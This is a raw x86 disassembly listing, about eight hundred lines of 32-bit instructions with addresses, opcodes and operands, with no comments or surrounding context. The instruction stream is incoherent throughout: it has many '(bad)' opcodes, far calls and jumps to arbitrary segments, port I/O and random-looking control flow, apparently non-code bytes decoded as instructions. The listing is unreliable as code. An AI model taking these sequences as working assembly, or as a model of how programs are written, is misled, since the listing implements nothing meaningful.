  420e35:	mov    esi,0x9d93c5cd
  420e3a:	xchg   esi,eax
  420e3b:	dec    edi
  420e3c:	inc    ebp
  420e3d:	aaa    
  420e3e:	mov    esi,?
  420e40:	mov    ebp,DWORD PTR [ecx-0x2a6d469c]
  420e46:	aam    0x6a
  420e48:	mov    esp,0xbf2b3a31
  420e4d:	inc    ebp
  420e4e:	mov    al,ds:0x2466c7f4
  420e53:	dec    ebx
  420e54:	call   0x8e5f:0xa8832bf0
  420e5b:	dec    esp
  420e5c:	pushf  
  420e5d:	jge    0x420def
  420e5f:	push   cs
  420e60:	mov    ah,0xf4
  420e62:	push   esi
  420e63:	sahf   
  420e64:	xchg   edx,eax
  420e65:	xor    BYTE PTR [ecx],bh
  420e67:	or     esi,DWORD PTR [ecx-0x17]
  420e6a:	pop    eax
  420e6b:	xchg   edi,eax
  420e6c:	jne    0x420e7a
  420e6e:	add    BYTE PTR [edx+0x71330f88],bh
  420e74:	push   ebp
  420e75:	repnz cwde 
  420e77:	scas   al,BYTE PTR es:[edi]
  420e78:	pop    ecx
  420e79:	(bad)  
  420e7a:	loope  0x420e90
  420e7c:	jle    0x420eb2
  420e7e:	adc    DWORD PTR [edi],0x28
  420e81:	xchg   edx,eax
  420e82:	xchg   ebx,eax
  420e83:	xor    ecx,DWORD PTR [edx+0x775e5a5]
  420e89:	div    BYTE PTR [ecx-0x2eabf6a6]
  420e8f:	mov    ds:0xc3163d99,eax
  420e94:	outs   dx,DWORD PTR ds:[esi]
  420e95:	sti    
  420e96:	in     al,0x42
  420e98:	outs   dx,DWORD PTR ds:[esi]
  420e99:	fnstenv [ecx+0x59]
  420e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e9d:	cmp    eax,0x4e16c3f9
  420ea2:	(bad)  
  420ea3:	or     dh,BYTE PTR [edi+0x4f7c1354]
  420ea9:	push   edi
  420eaa:	repnz push ebp
  420eac:	(bad)  
  420ead:	stc    
  420eae:	lods   al,BYTE PTR ds:[esi]
  420eaf:	(bad)  
  420eb0:	push   0x16dcbd62
  420eb5:	arpl   WORD PTR [esi-0x5eba157d],ax
  420ebb:	pushf  
  420ebc:	addr16 in al,dx
  420ebe:	sbb    al,0xab
  420ec0:	es push esp
  420ec2:	push   cs
  420ec3:	sbb    DWORD PTR [eax-0x31a0eb70],eax
  420ec9:	mov    esi,0xca3a4818
  420ece:	add    BYTE PTR [esi+0xce115c5],ch
  420ed4:	fild   QWORD PTR [eax-0x79]
  420ed7:	xchg   ebp,eax
  420ed8:	dec    ecx
  420ed9:	jbe    0x420ec3
  420edb:	mov    ebx,0xd7a406c9
  420ee0:	fs jae 0x420ec3
  420ee3:	test   al,0x1f
  420ee5:	cmp    ecx,ebp
  420ee7:	rol    DWORD PTR [edi*1-0x1e6cf670],cl
  420eee:	jnp    0x420ee5
  420ef0:	push   es
  420ef1:	xchg   ebp,eax
  420ef2:	or     al,0xf7
  420ef4:	(bad)  
  420ef5:	fwait
  420ef6:	push   edi
  420ef7:	mov    bl,0xe7
  420ef9:	pop    ds
  420efa:	in     al,dx
  420efb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420efc:	mov    eax,ds:0x158ae55f
  420f01:	mov    DWORD PTR [edx-0x79],eax
  420f04:	sbb    BYTE PTR [esi+0x7f32baa4],al
  420f0a:	std    
  420f0b:	daa    
  420f0c:	jg     0x420f68
  420f0e:	sbb    cl,BYTE PTR [ecx-0x74]
  420f11:	and    BYTE PTR [edi+0x8043b48],ah
  420f17:	mov    bh,0xa3
  420f19:	adc    edx,esp
  420f1b:	cmp    DWORD PTR [eax-0x38],edi
  420f1e:	ins    BYTE PTR es:[edi],dx
  420f1f:	popa   
  420f20:	pop    esi
  420f21:	aad    0xe0
  420f23:	jp     0x420ebc
  420f25:	jmp    0x2f76:0xbaef6627
  420f2c:	aad    0xfc
  420f2e:	test   eax,0x537a91d9
  420f33:	nop
  420f34:	push   cs
  420f35:	mov    cl,0xbe
  420f37:	inc    edi
  420f38:	retf   0xc5f1
  420f3b:	push   ebx
  420f3c:	mov    edi,0x94c1da02
  420f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f42:	push   0xffffffec
  420f44:	sub    al,0x37
  420f46:	pusha  
  420f47:	cld    
  420f48:	(bad)  
  420f49:	adc    esi,eax
  420f4b:	aam    0x3d
  420f4d:	push   ebx
  420f4e:	lea    ecx,[edi-0x39994b90]
  420f54:	push   ebx
  420f55:	sub    eax,DWORD PTR [edx-0x1d]
  420f58:	mov    dl,0xaa
  420f5a:	inc    ebx
  420f5b:	mov    eax,ds:0x6a41d739
  420f60:	mov    eax,ds:0x2ae937f5
  420f65:	push   0xffffffed
  420f67:	dec    ebp
  420f68:	xor    eax,0xcacd9742
  420f6d:	cmp    eax,esi
  420f6f:	push   ebx
  420f70:	pop    ds
  420f71:	imul   DWORD PTR [edx+0x28]
  420f74:	xchg   esp,eax
  420f75:	into   
  420f76:	xor    dl,BYTE PTR [esp+ecx*2+0x59]
  420f7a:	jmp    0x422673c3
  420f7f:	inc    eax
  420f80:	fldenv fs:[esi]
  420f83:	jmp    0xb237:0x16b58a66
  420f8a:	adc    bh,BYTE PTR [esi+0x18f28064]
  420f90:	les    edi,FWORD PTR [edi]
  420f92:	fsin   
  420f94:	jnp    0x420ff1
  420f96:	and    eax,0xd655fb7b
  420f9b:	fs out dx,al
  420f9d:	test   al,0xfa
  420f9f:	enter  0x81e3,0xac
  420fa3:	xchg   esi,eax
  420fa4:	dec    eax
  420fa5:	in     al,dx
  420fa6:	push   0x46
  420fa8:	out    0xe5,eax
  420faa:	dec    esi
  420fab:	cmc    
  420fac:	xlat   BYTE PTR ds:[ebx]
  420fad:	push   edx
  420fae:	fstp   TBYTE PTR [ebx-0xe314c0b]
  420fb4:	mov    ah,0x46
  420fb6:	inc    edx
  420fb7:	repz ret 
  420fb9:	(bad)  
  420fba:	(bad)  
  420fbc:	outs   dx,DWORD PTR ds:[si]
  420fbe:	(bad)  
  420fbf:	sldt   WORD PTR [eax]
	...
  42118e:	add    BYTE PTR [eax],al
  421190:	push   0xc
  421192:	lea    ebx,[eax-0x1806611]
  421198:	into   
  421199:	out    dx,al
  42119a:	popf   
  42119b:	adc    esp,DWORD PTR [esi]
  42119d:	ret    0x791a
  4211a0:	rcl    DWORD PTR [ebx+0x7220001],cl
  4211a6:	add    BYTE PTR [eax],al
  4211a8:	inc    ebp
  4211a9:	scas   eax,DWORD PTR es:[edi]
  4211aa:	mov    ds:0xf97d0eec,eax
  4211af:	lea    edx,[ebp+0x1387b5bd]
  4211b5:	dec    edi
  4211b6:	sub    cl,0xce
  4211b9:	fwait
  4211ba:	ret    0xb18c
  4211bd:	push   cs
  4211be:	or     esp,edi
  4211c0:	push   eax
  4211c1:	out    0x10,eax
  4211c3:	pop    ebp
  4211c4:	adc    dl,BYTE PTR [ebx-0x3488910b]
  4211ca:	dec    esp
  4211cb:	adc    bl,BYTE PTR [ebx]
  4211cd:	mov    edi,0x8bb467c9
  4211d2:	(bad)  
  4211d3:	sub    eax,0xd67b8276
  4211d8:	jmp    0x421217
  4211da:	mov    dl,0xc9
  4211dc:	mov    eax,ds:0x8e484d8
  4211e1:	pop    esp
  4211e2:	fcom   DWORD PTR [eax+0x39]
  4211e5:	data16 (bad) 
  4211e7:	mov    eax,0xaf584245
  4211ec:	mov    ds:0x9bc03cc7,eax
  4211f1:	cli    
  4211f2:	scas   al,BYTE PTR es:[edi]
  4211f3:	pop    es
  4211f4:	mov    ds:0xdc63f046,al
  4211f9:	aaa    
  4211fa:	mov    esi,0xa7628f93
  4211ff:	mov    bh,0xaa
  421201:	mov    cs,WORD PTR ds:0x383aa05f
  421207:	stos   BYTE PTR es:[edi],al
  421208:	call   0xda07e75d
  42120d:	pop    eax
  42120e:	iret   
  42120f:	pop    ecx
  421210:	neg    bh
  421212:	mov    edi,0xcc6f66fb
  421217:	dec    ecx
  421218:	rcr    DWORD PTR [edi-0x6a],0x3e
  42121c:	mov    esi,0x96bbf582
  421221:	xor    al,0xba
  421223:	mov    dh,dh
  421225:	add    eax,0x47bf72b1
  42122a:	or     al,0xbe
  42122c:	adc    cl,BYTE PTR [eax]
  42122e:	pop    es
  42122f:	stos   BYTE PTR es:[edi],al
  421230:	jle    0x4211ea
  421232:	jnp    0x421269
  421234:	(bad)  
  421235:	retf   0xaa9e
  421238:	rcl    BYTE PTR [ebp+0x40701510],1
  42123e:	mov    ebx,eax
  421240:	mov    ch,0xae
  421242:	mov    ecx,DWORD PTR [ecx+ecx*1-0x3e]
  421246:	mov    bh,BYTE PTR [ebx]
  421248:	dec    ecx
  421249:	es es mov al,0xd1
  42124d:	or     DWORD PTR ds:0x508ecfa2,ecx
  421253:	cwde   
  421254:	popf   
  421255:	test   DWORD PTR [ecx],esp
  421257:	arpl   WORD PTR [ebx+0x4247fa4a],dx
  42125d:	aam    0x79
  42125f:	pop    edi
  421260:	dec    ecx
  421261:	sub    al,0x21
  421263:	jnp    0x4212b6
  421265:	xchg   edi,esp
  421267:	mov    edi,0xb378b3
  42126c:	call   0xd5e:0xc17927dc
  421273:	adc    BYTE PTR [ecx-0x1b0dab24],0x41
  42127a:	cmp    edi,ecx
  42127c:	or     eax,0xcb3f02c1
  421281:	or     al,0x32
  421283:	push   0x56
  421285:	jb     0x4212a4
  421287:	and    DWORD PTR [ebx-0x1ebe3121],0x557490b3
  421291:	out    dx,eax
  421292:	fisttp DWORD PTR [esp+ecx*8-0x6b]
  421297:	pop    ds
  421298:	pop    edx
  421299:	outs   dx,DWORD PTR ds:[esi]
  42129a:	jmp    0x421268
  42129c:	adc    ecx,DWORD PTR [ebx]
  42129e:	or     DWORD PTR [edi+0x4607ae16],0x6cb8aa2b
  4212a8:	shr    BYTE PTR [edi+0x70],cl
  4212ab:	(bad)  
  4212ac:	dec    esp
  4212ad:	data16 sahf 
  4212af:	jmp    0x852e:0xf08c5282
  4212b6:	pushf  
  4212b7:	mov    edx,0xfa011a9f
  4212bc:	fs jp  0x42129f
  4212bf:	jmp    0xcbd9:0x8c212623
  4212c6:	xchg   edx,eax
  4212c7:	sar    BYTE PTR [ebp+0x1d],1
  4212ca:	ins    DWORD PTR es:[edi],dx
  4212cb:	inc    ebp
  4212cc:	xor    ebx,DWORD PTR [ebp+0x2f]
  4212cf:	sahf   
  4212d0:	je     0x42129e
  4212d2:	jp     0x4212eb
  4212d4:	mov    ds:0xe69ccd88,eax
  4212d9:	fwait
  4212da:	pop    eax
  4212db:	sbb    eax,0x6e6103ed
  4212e0:	out    0x34,eax
  4212e2:	lock inc ecx
  4212e4:	pop    ebx
  4212e5:	icebp  
  4212e6:	or     eax,0xf31892b3
  4212eb:	adc    DWORD PTR [ebp-0x11],ebp
  4212ee:	pop    edi
  4212ef:	xor    eax,0xe936809d
  4212f4:	xchg   esp,eax
  4212f5:	pop    es
  4212f6:	jp     0x42129a
  4212f8:	sub    esp,DWORD PTR [ecx+0x49b19cdf]
  4212fe:	jnp    0x421354
  421300:	out    dx,al
  421301:	in     al,dx
  421302:	popf   
  421303:	adc    esp,DWORD PTR [edx-0x5a]
  421306:	daa    
  421307:	add    cl,BYTE PTR [ecx]
  421309:	and    BYTE PTR [esi],cl
  42130b:	jl     0x421375
  42130d:	popf   
  42130e:	fmul   DWORD PTR [esi]
  421310:	push   ds
  421311:	or     BYTE PTR [ecx+0x59],dh
  421314:	bound  eax,QWORD PTR [ecx+ebp*2+0x1938ad72]
  42131b:	and    esp,DWORD PTR [ebx+0xbcf94cb]
  421321:	jmp    0x74bd8c4e
  421326:	scas   eax,DWORD PTR es:[edi]
  421327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421328:	add    DWORD PTR [eax],ebp
  42132a:	ja     0x4212e0
  42132c:	cmp    DWORD PTR [ebx-0x1d263b27],0xffffffed
  421333:	clc    
  421334:	lods   eax,DWORD PTR ds:[esi]
  421335:	sub    al,0x23
  421337:	or     BYTE PTR [eax],ch
  421339:	(bad)  
  42133a:	pusha  
  42133b:	mov    al,0x11
  42133d:	xor    bl,cl
  42133f:	cmc    
  421340:	jmp    0x2f27dad9
  421345:	call   0x91da:0x9cd6d05f
  42134c:	mov    ecx,0x4463ca8
  421351:	shr    al,cl
  421353:	mov    bh,BYTE PTR [edx+0x749c010c]
  421359:	das    
  42135a:	sub    BYTE PTR ds:0x1f9d97f,0x5a
  421361:	jns    0x42134f
  421363:	cmp    ecx,DWORD PTR ds:0x2b50ca7
  421369:	inc    eax
  42136a:	call   0x49b32dd4
  42136f:	mov    al,0xc9
  421371:	lods   eax,DWORD PTR ds:[esi]
  421372:	nop
  421373:	mov    esi,0xed5756c7
  421378:	xchg   DWORD PTR [edi],ecx
  42137a:	pushf  
  42137b:	adc    al,0x14
  42137d:	out    dx,al
  42137e:	cmp    DWORD PTR [eax+eax*2],esi
  421381:	nop
  421382:	sbb    eax,0xe2bb31da
  421387:	jo     0x42131c
  421389:	mov    eax,ds:0x541c686f
  42138e:	cmp    bh,BYTE PTR [ebp-0x1e]
  421391:	int    0x4f
  421393:	inc    ecx
  421394:	cmp    eax,0x693c9406
  421399:	mov    dl,BYTE PTR [eax+ecx*1+0x76]
  42139d:	fdivr  DWORD PTR [ebp+0x23]
  4213a0:	mov    eax,0xc21ef0d2
  4213a5:	cs jg  0x4213ee
  4213a8:	js     0x421343
  4213aa:	cli    
  4213ab:	(bad)  
  4213ac:	xor    BYTE PTR [eax-0x46acdc2],ah
  4213b2:	adc    al,0xcb
  4213b4:	add    DWORD PTR [eax+esi*8-0x4edb37d7],ecx
  4213bb:	jne    0x42141f
  4213bd:	ficomp WORD PTR [ecx+0x4e]
  4213c0:	call   0x4ffa0fdb
  4213c5:	mov    ds,WORD PTR [ebp+0x3f]
  4213c8:	mov    eax,ds:0xde9cfb0d
  4213cd:	add    ch,BYTE PTR [ebp-0x7d]
  4213d0:	mov    esp,0x66df4ffa
  4213d5:	mov    bl,0xb0
  4213d7:	int3   
  4213d8:	(bad)  
  4213d9:	and    edi,DWORD PTR [esi-0x6]
  4213dc:	push   ss
  4213dd:	jnp    0x421403
  4213df:	or     edi,DWORD PTR [edi]
  4213e1:	jmp    0x89b:0xeedc15c
  4213e8:	shr    DWORD PTR ss:[ebx-0x7d3a7cee],0xaf
  4213f0:	cmp    BYTE PTR [ebp-0x25],0x86
  4213f4:	push   esi
  4213f5:	pop    ecx
  4213f6:	xchg   edi,eax
  4213f7:	mov    al,0x3b
  4213f9:	dec    edi
  4213fa:	rol    BYTE PTR [eax],0xdf
  4213fd:	jg     0x42143a
  4213ff:	mov    ecx,0xc96100c1
  421404:	repz iret 
  421406:	lahf   
  421407:	cwde   
  421408:	out    0x74,eax
  42140a:	or     eax,0x266f44
  42140f:	data16 sahf 
  421411:	pop    ds
  421412:	int3   
  421413:	adc    esi,DWORD PTR [ebx+0x11]
  421416:	mov    bl,BYTE PTR [esp+edx*8-0x39]
  42141a:	xchg   ebp,eax
  42141b:	cld    
  42141c:	fsubr  DWORD PTR [edx+edi*2]
  42141f:	lock push 0xffffffda
  421422:	sub    DWORD PTR [ecx+0x11a4c944],0x42
  421429:	inc    ebx
  42142a:	out    dx,al
  42142b:	(bad)  
  42142c:	out    0x6f,al
  42142e:	mov    edi,0x7c9d347d
  421433:	leave  
  421434:	rcr    DWORD PTR [edx],cl
  421436:	ins    DWORD PTR es:[edi],dx
  421437:	sti    
  421438:	mov    al,ds:0x8827fc77
  42143d:	inc    edx
  42143e:	sbb    al,0xe8
  421440:	sbb    DWORD PTR [edx+eiz*8+0x5dc5d150],edi
  421447:	sar    DWORD PTR [ebp+0x1e],0xeb
  42144b:	push   es
  42144c:	loopne 0x42140b
  42144e:	jno    0x4214ad
  421450:	xor    eax,0xb89e794b
  421455:	imul   BYTE PTR [eax-0x3c713493]
  42145b:	add    ebx,ebx
  42145d:	xor    DWORD PTR [esi+0xdd94e29],eax
  421463:	fwait
  421464:	or     edx,DWORD PTR [esi]
  421466:	or     bh,ch
  421468:	inc    ebx
  421469:	test   BYTE PTR [eax],dl
  42146b:	sub    bl,dh
  42146d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42146e:	call   0xaa9b:0xe9e1392
  421475:	in     eax,dx
  421476:	dec    esi
  421477:	test   DWORD PTR [ebx+0x2fc8e8a9],0xbe064d9
  421481:	jno    0x42141a
  421483:	inc    eax
  421484:	test   edi,edi
  421486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421488:	add    ebx,ecx
  42148a:	jae    0x42150b
  42148c:	out    dx,eax
  42148d:	xor    eax,DWORD PTR [edi+0x45687f5b]
  421493:	sti    
  421494:	daa    
  421495:	sar    ebx,cl
  421497:	jg     0x42141e
  421499:	data16 out dx,al
  42149b:	icebp  
  42149c:	sbb    esi,esp
  42149e:	inc    edi
  42149f:	arpl   WORD PTR [ebx+0x3e],sp
  4214a2:	fist   DWORD PTR [edi-0x3e]
  4214a5:	jo     0x42150d
  4214a7:	push   ds
  4214a8:	fstp   DWORD PTR ds:0x597e98ed
  4214ae:	jnp    0x42145c
  4214b0:	push   ss
  4214b1:	sub    edi,DWORD PTR [edx+0x16]
  4214b4:	inc    esp
  4214b5:	push   ds
  4214b6:	add    ch,cl
  4214b8:	iret   
  4214b9:	xor    BYTE PTR [eax+eiz*2-0x49],dh
  4214bd:	adc    eax,0x94f4cdf3
  4214c2:	jns    0x421532
  4214c4:	jo     0x421496
  4214c6:	(bad)
  4214c9:	inc    ebx
  4214ca:	push   cs
  4214cb:	xor    al,0x1f
  4214cd:	(bad)  
  4214ce:	sbb    ecx,DWORD PTR [ebx-0x52543555]
  4214d4:	(bad)  
  4214d5:	ficomp DWORD PTR [ebp-0x46980102]
  4214db:	push   esp
  4214dc:	xor    bh,BYTE PTR [esp+eiz*2-0x467a5ec9]
  4214e3:	into   
  4214e4:	adc    eax,0x4d72faac
  4214e9:	mov    edx,eax
  4214eb:	mov    dh,0xd0
  4214ed:	inc    BYTE PTR [ecx+eax*2-0x5e10f76a]
  4214f4:	sar    BYTE PTR [bx+si+0x1d],1
  4214f8:	cdq    
  4214f9:	push   ebx
  4214fa:	inc    ebp
  4214fb:	cmc    
  4214fc:	adc    al,0x54
  4214fe:	and    eax,0xfd64dcd7
  421503:	pop    ss
  421504:	mov    eax,0xa0baaf4e
  421509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42150a:	rol    DWORD PTR [ecx-0x6c],0xbb
  42150e:	pop    es
  42150f:	in     al,0x4b
  421511:	inc    edx
  421512:	dec    BYTE PTR [eax-0x2f]
  421515:	cmp    ch,BYTE PTR [eax]
  421517:	or     esp,esp
  421519:	push   eax
  42151a:	sbb    eax,0x138c7fd8
  42151f:	jmp    0xba91:0x45ce8f9b
  421526:	stos   BYTE PTR es:[edi],al
  421527:	lds    ebx,FWORD PTR [edi+0x7]
  42152a:	adc    dh,dh
  42152c:	(bad)  
  42152e:	sub    eax,0xdba40c13
  421533:	jmp    DWORD PTR [esi+0x40]
  421536:	inc    ebx
  421537:	xor    al,0xf1
  421539:	fnstsw WORD PTR [edx]
  42153b:	jbe    0x4215b7
  42153d:	lods   al,BYTE PTR ds:[esi]
  42153e:	dec    edx
  42153f:	pop    edx
  421540:	sub    DWORD PTR [ebp+eax*2-0xb],0xffffff88
  421545:	dec    ebx
  421546:	sbb    edi,eax
  421548:	jg     0x4214f4
  42154a:	dec    ecx
  42154b:	pop    esi
  42154c:	imul   ebx,edi,0x8bfeb535
  421552:	mov    cs,WORD PTR [edx-0x19]
  421555:	adc    ah,BYTE PTR [edi]
  421557:	jle    0x421550
  421559:	addr16 mov dl,0x46
  42155c:	inc    edi
  42155d:	or     ebp,DWORD PTR [ebx-0x56]
  421560:	into   
  421561:	(bad)  
  421562:	mov    dl,0x3c
  421564:	and    edx,ebp
  421566:	xor    bh,BYTE PTR ds:0xe5244903
  42156c:	shl    ebp,cl
  42156e:	xor    ecx,DWORD PTR [esi+0x4c]
  421571:	ds pushf 
  421573:	and    ecx,edx
  421575:	adc    al,0xbc
  421577:	mov    dh,0xed
  421579:	popf   
  42157a:	dec    ebp
  42157b:	mov    cl,0x8e
  42157d:	xor    al,0xa6
  42157f:	dec    esp
  421580:	xor    dh,al
  421582:	mov    bh,0xa2
  421584:	jmp    0x42154f
  421586:	ss out 0x3b,eax
  421589:	xchg   ebp,eax
  42158a:	or     eax,0xf337a45a
  42158f:	out    dx,al
  421590:	dec    edi
  421591:	aad    0xf3
  421593:	repz cwde 
  421595:	mov    ds:0x432284e6,eax
  42159a:	push   ss
  42159b:	jge    0x4215e3
  42159d:	xchg   BYTE PTR [esi-0x349d17ab],al
  4215a3:	js     0x4215ca
  4215a5:	lods   eax,DWORD PTR ds:[esi]
  4215a6:	test   DWORD PTR [ecx+eax*4-0x37],edx
  4215aa:	push   edi
  4215ab:	push   ds
  4215ac:	in     al,0x6b
  4215ae:	lea    ebx,[ecx]
  4215b0:	sar    dh,0x6
  4215b3:	jle    0x421547
  4215b5:	adc    eax,0x4675905c
  4215ba:	add    DWORD PTR [edi*8+0x7c477e11],esp
  4215c1:	sbb    al,0xb2
  4215c3:	mov    DWORD PTR [ecx+0x1],eax
  4215c6:	sub    ebp,DWORD PTR ds:0xebb6cd01
  4215cc:	sbb    ebp,DWORD PTR fs:[eax]
  4215cf:	out    dx,eax
  4215d0:	mov    edx,0x5471e387
  4215d5:	jp     0x421591
  4215d7:	enter  0x75e7,0xba
  4215db:	sti    
  4215dc:	cli    
  4215dd:	mov    WORD PTR [ecx+0x7b],?
  4215e0:	dec    esi
  4215e1:	shl    BYTE PTR [ebp-0x60b32076],1
  4215e7:	(bad)  
  4215e8:	jo     0x4215ea
  4215ea:	sbb    ah,BYTE PTR [ecx+0x45]
  4215ed:	test   eax,0xcb5aec51
  4215f2:	push   ds
  4215f3:	push   0xffffffc1
  4215f5:	mov    esp,0xe3c0faba
  4215fa:	sti    
  4215fb:	(bad)  
  4215fc:	xchg   ebx,eax
  4215fd:	or     edx,DWORD PTR [ecx]
  4215ff:	dec    edi
  421600:	in     al,dx
  421601:	mov    ebx,0x53eac646
  421606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421607:	mov    esi,0xc426fae0
  42160c:	sbb    esp,DWORD PTR cs:[eax-0x93d5ee5]
  421613:	pop    eax
  421614:	or     eax,0x685c360
  421619:	ret    
  42161a:	aad    0x7a
  42161c:	lahf   
  42161d:	retf   
  42161e:	mov    esi,0x49151e7e
  421623:	xchg   ebx,eax
  421624:	ret    0xa349
  421627:	jb     0x4215b6
  421629:	push   0x98f06e09
  42162e:	aaa    
  42162f:	call   0x6b35:0xd1f554de
  421636:	(bad)
  421639:	inc    ebx
  42163a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42163b:	push   cs
  42163c:	fwait
  42163d:	mov    ah,0x78
  42163f:	mov    ebp,0xf93a9929
  421644:	and    ch,0xd0
  421647:	leave  
  421648:	(bad)  
  421649:	sbb    BYTE PTR gs:[esi],bh
  42164c:	pop    edi
  42164d:	mov    dh,0x3d
  42164f:	jmp    DWORD PTR [ebx-0x5db87a7c]
  421655:	inc    eax
  421656:	bound  edi,QWORD PTR [ebx]
  421658:	dec    ecx
  421659:	pop    eax
  42165a:	imul   edi,DWORD PTR [ecx-0x7b],0xffffffed
  42165e:	(bad)  
  42165f:	imul   edx,DWORD PTR [edi+0x27f1ed6],0xd
  421666:	stos   DWORD PTR es:[edi],eax
  421667:	inc    eax
  421668:	inc    ebp
  421669:	mov    dh,0x22
  42166b:	push   edx
  42166c:	mov    esi,0x16bad629
  421671:	sub    eax,0x50f51f10
  421676:	ror    BYTE PTR [eax+0x6a232306],0xca
  42167d:	pop    ecx
  42167e:	scas   eax,DWORD PTR es:[edi]
  42167f:	loopne 0x421645
  421681:	aas    
  421682:	popf   
  421683:	test   ebx,ebp
  421685:	stc    
  421686:	mov    esp,0x649f88be
  42168b:	xchg   esi,eax
  42168c:	jge    0x42161c
  42168e:	(bad)  
  421690:	in     eax,0xa4
  421692:	gs std 
  421694:	ret    0x6f3a
  421697:	add    eax,0x84fa6a81
  42169c:	fucom  st(7)
  42169e:	retf   0xe6f6
  4216a1:	daa    
  4216a2:	int3   
  4216a3:	shl    BYTE PTR [edx+esi*4+0x3d5b929e],0x3a
  4216ab:	xor    bl,BYTE PTR [ebp+0x45]
  4216ae:	pop    esi
  4216af:	xchg   ebp,eax
  4216b0:	stos   DWORD PTR es:[edi],eax
  4216b1:	inc    ebx
  4216b2:	fcomi  st,st(0)
  4216b4:	mov    al,ds:0x7b8d74e7
  4216b9:	add    DWORD PTR [esi],ebp
  4216bb:	pop    ds
  4216bc:	clc    
  4216bd:	mov    ebx,0x1eb6aaf5
  4216c2:	adc    BYTE PTR [esp+eax*1+0x71],dh
  4216c6:	mov    dh,0x59
  4216c8:	mov    eax,0x7e1a5c5a
  4216cd:	pop    ecx
  4216ce:	push   ebx
  4216cf:	ret    0xeb9a
  4216d2:	pop    edi
  4216d3:	pop    edx
  4216d4:	dec    ecx
  4216d5:	fiadd  WORD PTR [eax+0x33ffc660]
  4216db:	mov    gs,WORD PTR [ebx+0x76f70d90]
  4216e1:	rcl    DWORD PTR [ecx+edi*4-0x176d0466],0xaa
  4216e9:	xor    ecx,DWORD PTR [edi+0x4ad097e5]
  4216ef:	adc    eax,DWORD PTR [ebp-0x46]
  4216f2:	sbb    BYTE PTR [edi],ch
  4216f4:	ja     0x42171f
  4216f6:	mov    bh,0x32
  4216f8:	cmp    bh,ch
  4216fa:	ret    
  4216fb:	mov    edi,fs
  4216fd:	mov    dh,0x96
  4216ff:	push   eax
  421700:	repz and eax,0x3cf5ddd
  421706:	lods   eax,DWORD PTR ds:[esi]
  421707:	sbb    dl,BYTE PTR [ecx]
  421709:	push   edi
  42170a:	scas   al,BYTE PTR es:[edi]
  42170b:	add    ch,cl
  42170d:	stos   BYTE PTR es:[edi],al
  42170e:	sbb    edx,DWORD PTR [eax]
  421710:	(bad)  [ebp+0x5b]
  421713:	out    dx,eax
  421714:	fs pop edi
  421716:	inc    esi
  421717:	mul    DWORD PTR [ecx-0x4]
  42171a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42171b:	cmp    DWORD PTR [ebp*1+0x6b828c6],ebx
  421722:	test   dl,cl
  421724:	mov    al,ds:0x37e033d4
  421729:	xor    eax,0xce9af174
  42172e:	retf   
  42172f:	arpl   sp,di
  421731:	dec    esp
  421732:	lahf   
  421733:	ret    0x4679
  421736:	pop    ebx
  421737:	into   
  421738:	dec    eax
  421739:	sti    
  42173a:	mov    ds:0x781ee07e,al
  42173f:	in     eax,0xb8
  421741:	xlat   BYTE PTR fs:[ebx]
  421743:	xchg   edi,eax
  421744:	pusha  
  421745:	xchg   edi,eax
  421746:	or     esp,DWORD PTR [edi-0x6e9f5aa]
  42174c:	iret   
  42174d:	cdq    
  42174e:	popa   
  42174f:	fcomp  st(2)
  421751:	mov    dh,0xa0
  421753:	add    dh,BYTE PTR [edx+0x4087713c]
  421759:	dec    BYTE PTR [ecx+0x363cdea2]
  42175f:	lea    esp,[edx-0x382a29ca]
  421765:	jmp    0x421772
  421767:	jnp    0x4217b4
  421769:	sub    eax,0x893ab580
  42176e:	mov    cl,0x1e
  421770:	mov    ebp,0x81a5bf15
  421775:	mov    ebx,0x8b23b53d
  42177a:	add    al,0x2
  42177c:	push   eax
  42177d:	in     eax,0x7b
  42177f:	gs mov ecx,0xb435dbd9
  421785:	push   cs
  421786:	push   ebp
  421787:	adc    eax,0x28b19d5b
  42178c:	pop    esp
  42178d:	xchg   ebp,eax
  42178e:	(bad)  
  42178f:	pop    ss
  421790:	cs pop edx
  421792:	(bad)  
  421793:	mov    DWORD PTR [ebx],edx
  421795:	aad    0x87
  421797:	(bad)  
  421798:	cmp    eax,0xe68620cd
  42179d:	out    0x48,eax
  42179f:	sbb    eax,0x118dec17
  4217a4:	sub    ch,BYTE PTR [ecx+0x5b696cc6]
  4217aa:	mov    al,0xf1
  4217ac:	sbb    al,0x6b
  4217ae:	add    al,0x17
  4217b0:	dec    ecx
  4217b1:	mov    ecx,0xe73c59cc
  4217b6:	stc    
  4217b7:	stos   DWORD PTR es:[edi],eax
  4217b8:	push   ds
  4217b9:	or     DWORD PTR [edi+0x24f9eb16],eax
  4217bf:	sahf   
  4217c0:	inc    eax
  4217c1:	jmp    0xe6a7cb89
  4217c6:	pop    esi
  4217c7:	or     cl,BYTE PTR [ebp+0x3a7be664]
  4217cd:	xor    ebp,edi
  4217cf:	jns    0x42184c
  4217d1:	mov    bl,BYTE PTR [ebp-0x19]
  4217d4:	cmp    ebx,DWORD PTR [ecx+0x3ddb6169]
  4217da:	adc    ah,BYTE PTR [ebp-0x4b]
  4217dd:	xchg   DWORD PTR [edx],ebp
  4217df:	lods   eax,DWORD PTR ds:[esi]
  4217e0:	push   0xffffffd5
  4217e2:	mov    al,ds:0xda2677d
  4217e7:	add    eax,0xbcb8c1cb
  4217ec:	jb     0x421838
  4217ee:	and    BYTE PTR [ebx],ch
  4217f0:	lea    ecx,[ebp+0x3b5d941a]
  4217f6:	int    0x8c
  4217f8:	test   DWORD PTR [esp+ebp*2+0x79],ebp
  4217fc:	inc    esp
  4217fd:	fs in  eax,dx
  4217ff:	and    eax,0xc1172fae
  421804:	fimul  WORD PTR [ecx-0xeea8e91]
  42180a:	xchg   esi,eax
  42180b:	shr    DWORD PTR [esi],1
  42180d:	fdiv   DWORD PTR [edi+0x38e66b45]
  421813:	popf   
  421814:	inc    ebx
  421815:	add    DWORD PTR [ecx],0xd1db302d
